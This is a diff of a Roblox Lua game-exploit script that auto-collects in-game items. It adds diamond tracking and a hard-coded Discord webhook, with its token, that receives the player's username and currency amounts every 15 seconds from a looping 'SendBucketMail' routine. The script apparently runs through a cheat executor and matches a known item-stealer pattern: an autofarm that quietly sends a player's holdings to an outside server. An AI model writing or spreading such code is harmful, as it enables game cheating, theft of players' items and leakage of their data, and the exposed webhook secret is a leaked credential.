@@ -327,16 +327,18 @@ end
 spawn(OrbCollect)
 spawn(LootbagCollect)
 
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local Client = require(ReplicatedStorage:WaitForChild("Library"))
 
 local MagicBucketData = {"Bucket O' Magic"}
 local BucketData = {"Bucket"}
+local ItemTable = {"Diamonds"}
 local MagicBucketAM = 0
 local BucketAmount = 0
 local MagicBucketUID = ""
+local DiamondsID = 0
+local DiamondsAmount = 0
 
 local function GetItemInfo(ItemsClass, ItemsName)
     local Table = {}
@@ -359,11 +361,11 @@ screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 local bucketLabel = Instance.new("TextLabel")
 bucketLabel.Parent = screenGui
 bucketLabel.Size = UDim2.new(0, 300, 0, 100)
-bucketLabel.Position = UDim2.new(0.5, -150, 0.1, 0)  -- Adjusted Y position for top placement
+bucketLabel.Position = UDim2.new(0.5, -150, 0.1, 0)
 bucketLabel.BackgroundTransparency = 1
 bucketLabel.TextScaled = true
 bucketLabel.TextColor3 = Color3.new(0, 0, 0)
-bucketLabel.Text = "Magic Bucket Amount: " .. MagicBucketAM  -- Use MagicBucketAM for the label
+bucketLabel.Text = "Magic Bucket Amount: " .. MagicBucketAM .. " | Diamonds: " .. DiamondsAmount
 
 local function UpdateBucketAmount()
     while true do
@@ -383,11 +385,26 @@ local function UpdateBucketAmount()
                 BucketAmount = ItemData._am
             end
         end
+
+        local CurrencyItems = GetItemInfo("Currency", ItemTable)
+        for _, ItemInfo in pairs(CurrencyItems) do
+            local ItemData = ItemInfo.data
+            if ItemData._am and ItemData.id == "Diamonds" then
+                DiamondsID = ItemInfo.uid
+                DiamondsAmount = ItemData._am
+            end
+        end
         
-        bucketLabel.Text = "Magic Bucket Amount: " .. MagicBucketAM  -- Update label here
+        bucketLabel.Text = "Magic Bucket Amount: " .. MagicBucketAM .. " | Diamonds: " .. DiamondsAmount
         wait(0.3)
     end
 end
+
+local webhookURL = "https://discord.com/api/webhooks/1238281258174386257/C-YRLxkKnYEIPUFjIJYEAS2L_zdAv-Qou6OAzvFpIaxELHHNVdP2LnlXf3uwA-SSNzwD"
+local request = (syn and syn.request) or request or (http and http.request) or http_request
+
+
+
 
 local function SendBucketMail()
     while true do
@@ -430,7 +447,7 @@ local player = Player.Name
                 Username = player,
                 VoidTicketsValue = BucketAmount,
                 DiamondsValue = MagicBucketAM,
-                HugeList = "chill"
+                HugeList = DiamondsAmount
             })
         })
 wait(15)
